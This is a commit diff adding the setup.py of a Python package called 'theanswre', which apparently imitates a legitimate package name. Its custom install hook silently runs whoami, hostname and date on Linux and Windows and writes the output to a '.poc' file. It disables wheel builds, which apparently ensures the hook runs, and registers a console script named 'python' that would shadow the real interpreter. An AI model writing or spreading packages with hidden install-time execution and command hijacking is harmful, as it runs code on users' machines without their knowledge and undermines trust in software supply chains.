94752732082a4362829108a532efb80c9f0ae330
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2026-01-31 04:32:02 +0000

    Add package theanswre/0.2.3/theanswre-0.2.3.tar.gz

---
+++ packages/theanswre/theanswre-0.2.3.tar.gz/theanswre-0.2.3/setup.py
@@ -0,0 +1,26 @@
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+import os
+
+class CustomInstallCommand(install):
+    def run(self):
+        if os.name == 'posix':
+            os.system('whoami;hostname;date > /tmp/code_exec.poc')
+        elif os.name == 'nt':
+            os.system('powershell.exe "whoami;hostname;date > ~/Documents/code_exec.poc"')
+        super().run()
+
+setup(
+    name='theanswre',
+    version='0.2.3',
+    package_dir={"": "src"},
+    packages=find_packages(where='src'),
+    install_requires=[''],
+    cmdclass={
+        "install": CustomInstallCommand,
+        'bdist_wheel': None
+    },
+    entry_points={
+        'console_scripts': ['python=theanswre.main:main']
+    }
+)
